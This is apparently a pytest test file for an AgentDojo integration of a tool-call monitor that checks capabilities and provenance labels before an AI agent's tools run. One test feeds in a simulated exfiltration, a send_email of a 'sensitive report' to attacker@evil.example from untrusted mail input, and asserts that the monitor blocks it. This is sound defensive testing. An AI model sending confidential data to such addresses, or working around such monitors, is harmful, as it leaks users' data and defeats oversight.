from __future__ import annotations

from types import SimpleNamespace
from typing import Any

import pytest

pytest.importorskip("agentdojo")

from agentdojo.functions_runtime import FunctionCall

from paca.integrations.agentdojo import (
    PacaToolsExecutor,
    aggregate_prior_output_labels,
)
from paca.monitor import Monitor
from paca.provenance import Arg, Label
from paca.runtime import Capability, Request


class RuntimeStub:
    def __init__(self, names: list[str], result: Any = "tool-result") -> None:
        self.functions = {name: SimpleNamespace(name=name) for name in names}
        self.result = result
        self.calls: list[tuple[str, dict[str, Any]]] = []

    def run_function(self, env: Any, function_name: str, arguments: dict[str, Any]):
        self.calls.append((function_name, arguments))
        return self.result, None


def _run(executor, runtime, function_name, args, extra_args=None):
    call = FunctionCall(function=function_name, args=args, id="call-1")
    messages = [{
        "role": "assistant",
        "content": None,
        "tool_calls": [call],
    }]
    return executor.query("task", runtime, object(), messages, extra_args or {})


def test_agentdojo_adapter_authorizes_before_dispatch_and_retains_read_label():
    cap = Capability(
        "cap-1", "user@example.test", "tenant-a", "task-1", "assistant",
        {"read_file": ("/tenant-a/report.txt",)}, expires=100,
    )

    def request_builder(function_name, arguments, env, extra_args):
        assert function_name == "read_report"
        return Request(
            "read_file",
            {"path": Arg(arguments["path"], Label("untrusted", origins=frozenset({"tool_call"})))},
            cap,
            step=1,
            resource=Label(
                "untrusted", sensitivity=2, tenant="tenant-a",
                origins=frozenset({"tenant_file_store"}),
            ),
        )

    runtime = RuntimeStub(["read_report"], result="confidential report body")
    executor = PacaToolsExecutor(Monitor(), request_builder)

    _, _, _, messages, state = _run(
        executor, runtime, "read_report", {"path": "/tenant-a/report.txt"}
    )

    assert len(runtime.calls) == 1
    assert runtime.calls[0][1] == {"path": "/tenant-a/report.txt"}
    assert messages[-1]["role"] == "tool"
    assert "confidential report body" in messages[-1]["content"][0]["content"]
    assert state["paca_output_labels"]["call-1"].sensitivity == 2
    assert aggregate_prior_output_labels(state).sensitivity == 2
    assert aggregate_prior_output_labels(state).integrity == "untrusted"


def test_agentdojo_adapter_denies_sensitive_egress_before_function_runs():
    cap = Capability(
        "cap-2", "user@example.test", "tenant-a", "task-2", "assistant",
        {"send_email": ("*@evil.example",)}, expires=100,
    )

    def request_builder(function_name, arguments, env, extra_args):
        assert function_name == "send_report"
        return Request(
            "send_email",
            {
                "to": Arg(arguments["recipient"], Label("untrusted", origins=frozenset({"external_mail"}))),
                "body": Arg("sensitive report", Label("trusted", 3, "tenant-a")),
            },
            cap,
            step=1,
        )

    runtime = RuntimeStub(["send_report"])
    executor = PacaToolsExecutor(Monitor(), request_builder)
    _, _, _, messages, _ = _run(
        executor,
        runtime,
        "send_report",
        {"recipient": "attacker@evil.example", "body": "sensitive report"},
    )

    assert runtime.calls == []
    assert "did not authorize" in messages[-1]["content"][0]["content"]
    assert messages[-1]["error"] is not None


def test_agentdojo_adapter_fails_closed_when_approval_is_required():
    cap = Capability(
        "cap-3", "user@example.test", "tenant-a", "task-3", "assistant",
        {"send_email": ("*@partner.example",)}, expires=100,
    )

    def request_builder(function_name, arguments, env, extra_args):
        return Request(
            "send_email",
            {
                "to": Arg(arguments["recipient"], Label("untrusted", origins=frozenset({"model_argument"}))),
                "body": Arg("public update", Label("trusted", 0, "tenant-a")),
            },
            cap,
            step=1,
        )

    runtime = RuntimeStub(["send_update"])
    executor = PacaToolsExecutor(Monitor(), request_builder)
    _, _, _, messages, _ = _run(
        executor,
        runtime,
        "send_update",
        {"recipient": "person@partner.example", "body": "public update"},
    )

    assert runtime.calls == []
    assert "needs_approval" in messages[-1]["error"]


def test_agentdojo_adapter_does_not_execute_when_request_builder_fails():
    def request_builder(function_name, arguments, env, extra_args):
        raise ValueError("no task grant mapping")

    runtime = RuntimeStub(["unmapped_tool"])
    executor = PacaToolsExecutor(Monitor(), request_builder)
    _, _, _, messages, _ = _run(
        executor, runtime, "unmapped_tool", {"destination": "example.test"}
    )

    assert runtime.calls == []
    assert "integration error" in messages[-1]["error"]


def test_agentdojo_adapter_binds_all_executed_arguments():
    cap = Capability(
        "cap-4", "user@example.test", "tenant-a", "task-4", "assistant",
        {"read_file": ("/tenant-a/report.txt",)}, expires=100,
    )
    observed = {}

    def request_builder(function_name, arguments, env, extra_args):
        observed.update(arguments)
        return Request(
            "read_file",
            {"path": Arg(arguments["path"], Label("untrusted"))},
            cap,
            step=1,
            resource=Label("untrusted", sensitivity=1, tenant="tenant-a"),
        )

    runtime = RuntimeStub(["read_report"])
    executor = PacaToolsExecutor(Monitor(), request_builder)
    _, _, _, _, _ = _run(
        executor,
        runtime,
        "read_report",
        {"path": "/tenant-a/report.txt", "selectors": "['name', 'summary']"},
    )

    assert runtime.calls == [(
        "read_report",
        {"path": "/tenant-a/report.txt", "selectors": ["name", "summary"]},
    )]
    assert observed["selectors"] == ["name", "summary"]
